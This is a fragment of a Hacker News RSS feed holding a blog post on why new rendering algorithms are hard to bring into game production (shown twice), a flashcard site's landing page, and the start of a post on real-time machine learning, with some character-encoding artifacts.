<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.hayabusa2.jaxa.jp/en/topics/20201225_samples/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558874</guid>
            <pubDate>Mon, 28 Dec 2020 13:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics (still) a challenge?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25558815">thread link</a>) | @mariuz
<br/>
December 28, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms ‚Äì especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin‚Äôs Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored ‚Äì they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like ‚Äúwhy is this brilliant research technique X not used in production?‚Äù both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by ‚Äúdismissing‚Äù most of the rendering techniques ‚Äì that they are not going to work on foliage. üôÇ&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how ‚Äúphotogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!‚Äù. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career ‚Äì who haven‚Äôt built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit ‚Äúhow sausages are made‚Äù. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn‚Äôt place ‚Äúpure‚Äù academic researchers in the above list ‚Äì as I don‚Äôt think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I‚Äôll be happy if you‚Äôre interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note ‚Äì <strong>none </strong>of the ‚Äúobstacles‚Äù I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it ‚Äì most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way ‚Äì manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> ‚Äì potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of ‚Äúuse cases‚Äù deserve some explanation and description of ‚Äúseverity‚Äù of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code ‚Äì just don‚Äôt have expectations that turning a tech demo into a production ready feature is simple or easy (it‚Äôs more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level ‚Äúup‚Äù in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn‚Äôt need to be very ‚Äúrobust‚Äù, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin‚Äôs Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin‚Äôs Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels ‚Äì and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were ‚Äúcut off‚Äù from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake ‚Äúcaustics‚Äù</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster ‚Äì obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> ‚Äì just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting ‚Äì but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>‚ÄúRegular‚Äù features ‚Äì lighting, particles, geometry rendering ‚Äì are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let‚Äôs take VR ‚Äì there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily ‚Äì as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let‚Äôs have a look at compatibility of a newly developed feature with some other common ‚Äúfeatures‚Äù (the distinction between ‚Äúfeatures‚Äù, and the next large section ‚Äúpipeline‚Äù is fuzzy).</p>



<p>Features are not the most important of challenges ‚Äì arguably the category I‚Äôm going to cover at the end (the ‚Äúprocess‚Äù) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>‚Äì a ‚Äúfeature‚Äù that inspired this post ‚Äì is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many ‚Äúoptimizations‚Äù and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage ‚Äì that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any ‚Äúnatural‚Äù environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates ‚Äúalpha‚Äù value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn‚Äôt render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage‚Ä¶).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation ‚Äì skeletal</h3>



<p>Most animators work with ‚Äúskeletal animations‚Äù. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to ‚Äúdeform‚Äù it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel ‚Äì it‚Äôs much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had ‚Äúskeletons‚Äù and ‚Äúbones‚Äù and were using skeletal animations!</figcaption></figure>



<h3>Animation ‚Äì procedural and non-rigid</h3>



<p>The next category of animations are ‚Äúprocedural‚Äù and non-rigid. Procedural animations are useful for any animation that is ‚Äúendless‚Äù, relatively simple, and shouldn‚Äôt loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558815</guid>
            <pubDate>Mon, 28 Dec 2020 12:51:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a flashcard platform that supports latex and code highlighting]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25558420">thread link</a>) | @mvind
<br/>
December 28, 2020 | https://memordo.com/m/h | <a href="https://web.archive.org/web/*/https://memordo.com/m/h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-28a2eea8=""><p><img id="hero-pic" src="https://memordo-assets.ams3.digitaloceanspaces.com/front-page-assets/Group%203%20%281%29.png" data-v-28a2eea8=""></p> <div data-v-28a2eea8=""> <h3 data-v-28a2eea8="">
        Introducing the all-new collaborative flashcard platform, lovingly made to help you.

      </h3> </div></div><div data-v-28a2eea8=""><div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/typing.801f4d3.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
             Use the familiar Anki flashcard types like <strong data-v-28a2eea8=""> single</strong>, <strong data-v-28a2eea8="">double</strong>, <strong data-v-28a2eea8="">cloze deletion</strong>.
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/schedule.cbe60f8.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
          Create <strong data-v-28a2eea8=""> custom study schedules </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/analytics.3f4cba7.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            Gain <strong data-v-28a2eea8=""> insights </strong> into your studying
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/network.edf1efc.svg" data-v-28a2eea8=""> <br data-v-28a2eea8=""> <strong data-v-28a2eea8=""> Share </strong> and <strong data-v-28a2eea8=""> collaborate </strong> in creating flashcards
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/digital-marketing.7ca7dbb.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
            Create flashcards with <strong data-v-28a2eea8="">images</strong>, <strong data-v-28a2eea8=""> latex</strong>, <strong data-v-28a2eea8=""> code</strong>, <strong data-v-28a2eea8=""> languages </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/reminder.2a2f3d4.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            We help <strong data-v-28a2eea8="">reminding</strong> you to study
          </p></div></div></div>]]>
            </description>
            <link>https://memordo.com/m/h</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558420</guid>
            <pubDate>Mon, 28 Dec 2020 11:34:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics challenging? Productionizing rendering algorithms]]>
            </title>
            <description>
<![CDATA[
Score 128 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25557431">thread link</a>) | @bartwr
<br/>
December 27, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms ‚Äì especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin‚Äôs Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored ‚Äì they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like ‚Äúwhy is this brilliant research technique X not used in production?‚Äù both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by ‚Äúdismissing‚Äù most of the rendering techniques ‚Äì that they are not going to work on foliage. üôÇ&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how ‚Äúphotogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!‚Äù. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career ‚Äì who haven‚Äôt built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit ‚Äúhow sausages are made‚Äù. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn‚Äôt place ‚Äúpure‚Äù academic researchers in the above list ‚Äì as I don‚Äôt think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I‚Äôll be happy if you‚Äôre interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note ‚Äì <strong>none </strong>of the ‚Äúobstacles‚Äù I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it ‚Äì most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way ‚Äì manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> ‚Äì potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of ‚Äúuse cases‚Äù deserve some explanation and description of ‚Äúseverity‚Äù of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code ‚Äì just don‚Äôt have expectations that turning a tech demo into a production ready feature is simple or easy (it‚Äôs more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level ‚Äúup‚Äù in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn‚Äôt need to be very ‚Äúrobust‚Äù, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin‚Äôs Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin‚Äôs Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels ‚Äì and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were ‚Äúcut off‚Äù from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake ‚Äúcaustics‚Äù</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster ‚Äì obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> ‚Äì just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting ‚Äì but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>‚ÄúRegular‚Äù features ‚Äì lighting, particles, geometry rendering ‚Äì are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let‚Äôs take VR ‚Äì there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily ‚Äì as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let‚Äôs have a look at compatibility of a newly developed feature with some other common ‚Äúfeatures‚Äù (the distinction between ‚Äúfeatures‚Äù, and the next large section ‚Äúpipeline‚Äù is fuzzy).</p>



<p>Features are not the most important of challenges ‚Äì arguably the category I‚Äôm going to cover at the end (the ‚Äúprocess‚Äù) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>‚Äì a ‚Äúfeature‚Äù that inspired this post ‚Äì is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many ‚Äúoptimizations‚Äù and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage ‚Äì that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any ‚Äúnatural‚Äù environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates ‚Äúalpha‚Äù value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn‚Äôt render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage‚Ä¶).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation ‚Äì skeletal</h3>



<p>Most animators work with ‚Äúskeletal animations‚Äù. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to ‚Äúdeform‚Äù it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel ‚Äì it‚Äôs much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had ‚Äúskeletons‚Äù and ‚Äúbones‚Äù and were using skeletal animations!</figcaption></figure>



<h3>Animation ‚Äì procedural and non-rigid</h3>



<p>The next category of animations are ‚Äúprocedural‚Äù and non-rigid. Procedural animations are useful for any animation that is ‚Äúendless‚Äù, relatively simple, and shouldn‚Äôt loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557431</guid>
            <pubDate>Mon, 28 Dec 2020 07:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine learning is going real-time]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557412">thread link</a>) | @yoquan
<br/>
December 27, 2020 | https://huyenchip.com/2020/12/27/real-time-machine-learning.html | <a href="https://web.archive.org/web/*/https://huyenchip.com/2020/12/27/real-time-machine-learning.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>After talking to machine learning and infrastructure engineers at major Internet companies across the US, Europe, and China, I noticed two groups of companies. One group has made significant investments (hundreds of millions of dollars) into infrastructure to allow real-time machine learning and has already seen returns on their investments. Another group still wonders if there‚Äôs value in real-time ML.</p>

<p>There seems to be little consensus on what real-time ML means, and there hasn‚Äôt been a lot of in-depth discussion on how it‚Äôs done in the industry. In this post, I want to share what I‚Äôve learned after talking to about a dozen companies that are doing it.</p>

<p>There are two levels of real-time machine learning that I‚Äôll go over in this post.</p>
<ul>
  <li>Level 1: Your ML system makes predictions in real-time (online predictions).</li>
  <li>Level 2: Your system can incorporate new data and update your model in real-time (online learning).</li>
</ul>

<p>I use ‚Äúmodel‚Äù to refer to the machine learning model and ‚Äúsystem‚Äù to refer to the infrastructure around it, including data pipeline and monitoring systems.</p>

<hr>
<p><b>Table of contents</b><br>
‚Ä¶. <a href="#online_predictions">Level 1: Online predictions - your system can make predictions in real-time</a><br>
‚Ä¶‚Ä¶.. <a href="#online_predictions_use_cases">Use cases</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶ <a href="#problems_batch_predictions">Problems with batch predictions</a><br>
‚Ä¶‚Ä¶.. <a href="#online_predictions_solutions">Solutions</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶ <a href="#fast_inference">Fast inference</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶ <a href="#stream_pipeline">Real-time pipeline</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶. <a href="#stream_processing_vs_batch_processing">Stream processing vs. batch processing</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶. <a href="#event_driven_vs_request_driven">Event-driven vs. request-driven</a><br>
‚Ä¶‚Ä¶.. <a href="#online_predictions_challenges">Challenges</a><br>
‚Ä¶. <a href="#online_learning">Level 2: Online learning - your system can incorporate new data and update in real-time</a><br>
‚Ä¶‚Ä¶.. <a href="#online_learning_definition">Defining ‚Äúonline learning‚Äù</a><br>
‚Ä¶‚Ä¶.. <a href="#online_learning_use_cases">Use case</a><br>
‚Ä¶‚Ä¶.. <a href="#online_learning_solutions">Solutions</a><br>
‚Ä¶‚Ä¶.. <a href="#online_learning_challenges">Challenges</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶ <a href="#online_learning_theoretical_challenges">Theoretical</a><br>
‚Ä¶‚Ä¶‚Ä¶‚Ä¶ <a href="#online_learning_practical_challenges">Practical</a><br>
‚Ä¶. <a href="#mlops_china_vs_us">The MLOps race between the US and China</a><br>
‚Ä¶. <a href="#conclusion">Conclusion</a><br></p>

<hr>

<h2 id="online_predictions">Level 1: Online predictions - your system can make predictions in real-time</h2>
<p><em><b>Real-time</b> here is defined to be in the order of milliseconds to seconds.</em></p>

<h3 id="online_predictions_use_cases">Use cases</h3>
<p>Latency matters, especially for user-facing applications. In 2009, Google‚Äôs experiments demonstrated that <a href="https://services.google.com/fh/files/blogs/google_delayexp.pdf">increasing web search latency 100 to 400 ms reduces the daily number of searches per user by 0.2% to 0.6%</a>. In 2019, <a href="https://blog.acolyer.org/2019/10/07/150-successful-machine-learning-models/">Booking.com found that an increase of 30% in latency cost about 0.5% in conversion rates ‚Äî ‚Äúa relevant cost for our business.‚Äù</a></p>

<p>No matter how great your ML models are, if they take just milliseconds too long to make predictions, users are going to click on something else.</p>

<h4 id="problems_batch_predictions">Problems with batch predictions</h4>
<p>One non-solution is to avoid making predictions online. You can generate predictions in batch offline, store them (e.g. in SQL tables), and pull out pre-computed predictions when needed.</p>

<p>This can work when the input space is finite ‚Äì you know exactly how many possible inputs to make predictions for. One example is when you need to generate movie recommendations for your users ‚Äì you know exactly how many users there are. So you predict a set of recommendations for each user periodically, such as every few hours.</p>

<p>To make their user input space finite, many apps make their users choose from categories instead of entering wild queries. For example, if you go to TripAdvisor, you first have to pick a predefined metropolis area instead of being able to enter just any location.</p>

<p>This approach has many limitations. TripAdvisor results are okay within their predefined categories, such as <b>‚ÄúRestaurants‚Äù</b> in <b>‚ÄúSan Francisco‚Äù</b>, but are pretty bad when you try to enter wild queries like <b>‚Äúhigh rating Thai restaurants in Hayes Valley‚Äù</b>.</p>

<center>
<figure>
<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/1_tripadvisor.png">
</figure>
</center>

<p>Limitations caused by batch predictions exist even in more technologically progressive companies like Netflix. Say, you‚Äôve been watching a lot of horrors lately, so when you first log into Netflix, horror movies dominate recommendations. But you‚Äôre feeling bright today so you search ‚Äúcomedy‚Äù and start browsing the comedy category. Netflix should learn and show you more comedy in your list of their recommendations, right? But it can‚Äôt update the list until the next time batch recommendations are generated.</p>

